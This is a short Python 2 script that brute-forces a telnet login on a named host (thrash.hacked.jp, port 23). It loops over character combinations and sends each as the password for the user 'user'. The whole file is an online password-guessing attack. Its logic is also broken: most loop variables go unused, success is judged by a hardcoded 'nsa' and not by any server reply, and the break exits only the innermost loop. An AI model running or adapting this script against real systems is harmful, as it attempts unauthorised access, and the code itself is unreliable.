import sys, socket, array

def brute_force():
	length = 8
	chars = [127] * 10
	for a in range(0,chars[0]):
		for b in range(0,chars[1]):
			for c in range(0,chars[2]):
				for d in range(0,chars[3]):
					for w in range(0,chars[4]):
						for x in range(0,chars[5]):
							for y in range(0,chars[6]):
								for z in range(0,127):
									#password = chr(z) + chr(y) + chr(x)
									password = chr(z) + chr(y) + chr(x)
									print "Trying password: ", password
									try_password(password)
									if password == "nsa":
										print "Password found!", password
										break


def try_password(password):
	host = "thrash.hacked.jp"
	port = 23
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	login_prompt = s.recv(16)
	login = "user"
	s.send(login)
	password_prompt = s.recv(16)
	s.send(password)
	s.close()

brute_force()
